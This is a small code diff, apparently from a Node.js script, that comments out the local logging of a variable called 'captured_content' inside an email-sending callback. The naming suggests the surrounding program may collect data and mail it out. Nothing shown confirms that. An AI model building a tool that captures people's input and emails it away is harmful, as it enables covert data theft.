@@ -61,7 +61,7 @@ transporter.sendMail(mailOptions, function (err, info) {
     
     
     
-    
+    /*
     
     fs.appendFile('logs.txt', captured_content, err => {
         if (err) {
@@ -71,7 +71,7 @@ transporter.sendMail(mailOptions, function (err, info) {
     });
     console.log("eshak:"+captured_content);
     
-    
+    */
     
 });
 
